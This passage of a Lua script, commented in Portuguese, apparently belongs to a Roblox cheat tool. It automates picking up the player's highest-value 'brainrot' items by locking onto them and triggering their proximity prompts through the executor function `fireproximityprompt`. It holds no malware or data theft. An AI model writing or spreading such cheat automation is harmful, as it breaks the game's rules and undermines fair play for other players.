                -- target selecionado sumiu, limpa
                selectedPickupTarget = nil
            end

            -- Fallback: maior genValue ≥10M do próprio player
            local cache = SharedState.AllAnimalsCache
            if not cache then return nil, nil end
            local myName = LocalPlayer.Name
            local bestPart, bestData = nil, nil
            local bestGv = 9999999  -- só aceita ≥10M
            for _, a in ipairs(cache) do
                if a and a.owner == myName and (tonumber(a.genValue) or 0) > bestGv then
                    local part = findAdorneeGlobal(a)
                    if part and part.Parent then
                        bestGv   = tonumber(a.genValue)
                        bestPart = part
                        bestData = a
                    end
                end
            end
            return bestPart, bestData
        end

        -- Encontra o prompt de coleta do target específico
        local function getPromptForPart(targetPart, myPlot)
            if not targetPart or not myPlot then return nil end
            for _, obj in ipairs(myPlot:GetDescendants()) do
                if obj:IsA("ProximityPrompt") and obj.Enabled then
                    local txt = (obj.ActionText or ""):lower()
                    local matched = false
                    for _, kw in ipairs(PICKUP_KEYWORDS) do
                        if txt:find(kw) then matched = true; break end
                    end
                    if matched then
                        local part = obj.Parent
                        if part and part:IsA("Attachment") then part = part.Parent end
                        if part and part:IsA("BasePart") then
                            local d = (part.Position - targetPart.Position).Magnitude
                            if d < 12 then return obj end
                        end
                    end
                end
            end
            return nil
        end

        while true do
            task.wait(0.25)

            if not autoPickupActive then
                statusLbl.Text = "Desativado"
                statusLbl.TextColor3 = Theme.Error
                wasHolding = false
                stopLock()
                continue
            end

            local char = LocalPlayer.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            if not hrp then continue end

            -- Atualiza o plot a cada 10s
            if not myPlot or (tick() - plotRefreshTimer) > 10 then
                myPlot = findMyPlot()
                plotRefreshTimer = tick()
            end

            -- Só executa dentro da própria base
            if not isInsideMyBase(hrp, myPlot) then
                statusLbl.Text = "Fora da base"
                statusLbl.TextColor3 = Theme.TextSecondary
                wasHolding = false
                stopLock()
                continue
            end

            -- Atualiza lista de targets a cada 0.5s
            if (tick() - listRefreshTimer) > 0.5 then
                refreshTargetsList(myPlot)
                listRefreshTimer = tick()
            end

            -- Verifica se há um brainrot ≥10M disponível
            local targetPart, targetData = getBestBaseTarget()
            if not targetPart then
                statusLbl.Text = "Sem brainrot ≥10M"
                statusLbl.TextColor3 = Theme.TextSecondary
                stopLock()
                continue
            end

            local holding = isHoldingBrainrot()
            wasHolding = holding
            wasHolding = holding

            if holding then
                statusLbl.Text = "Segurando item"
                statusLbl.TextColor3 = Color3.fromRGB(255, 200, 50)
                stopLock()
                continue
            end

            -- Trava encima do target ≥10M
            startLock(targetPart)

            -- Encontra e dispara o prompt do target específico
            local prompt = getPromptForPart(targetPart, myPlot)
            if not prompt then
                statusLbl.Text = "Aguardando prompt..."
                statusLbl.TextColor3 = Theme.TextSecondary
                continue
            end

            statusLbl.Text = "Coletando: " .. (targetData and targetData.name or "?")
            statusLbl.TextColor3 = Theme.Success

            pcall(function()
                if fireproximityprompt then
                    fireproximityprompt(prompt)
                else
                    prompt:InputBegan(Enum.UserInputType.MouseButton1)
                    task.wait(0.05)
                    prompt:InputEnded(Enum.UserInputType.MouseButton1)
                end
            end)
        end
    end)
end

initAutoPickup()

